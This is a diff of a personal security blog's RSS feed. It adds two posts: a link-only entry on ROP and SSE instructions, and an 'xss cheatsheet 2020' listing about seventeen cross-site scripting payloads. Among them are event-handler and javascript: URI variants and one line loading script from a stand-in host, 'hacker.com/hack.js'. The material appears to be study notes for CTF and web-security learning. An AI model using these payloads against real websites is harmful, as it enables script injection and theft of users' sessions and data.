@@ -9,8 +9,34 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>정동현(JHYEON BLOG)</description>
-    <pubDate>Sun, 17 Jan 2021 08:07:13 GMT</pubDate>
+    <pubDate>Sun, 17 Jan 2021 08:15:50 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>ROP &amp; SSE Instruction</title>
+      <link>https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/</link>
+      <guid>https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/</guid>
+      <pubDate>Sun, 09 Feb 2020 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;(&lt;a href=&quot;https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca5</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>(<a href="https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659)[Open">https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659)[Open</a> Notion]</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Pwnable/">Pwnable</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Pwn-ROP/">Pwn, ROP</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>DIMICTF 2019 Write up</title>
@@ -60,6 +86,32 @@
       
       
       <comments>https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>xss cheatsheet 2020</title>
+      <link>https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/</link>
+      <guid>https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/</guid>
+      <pubDate>Tue, 04 Feb 2020 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> data:text/html,<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> */alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>/*</span><br><span class="line"><span class="javascript"> <span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web-XSS-CheatSheet/">Web, XSS, CheatSheet</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/#disqus_thread</comments>
       
     </item>
     
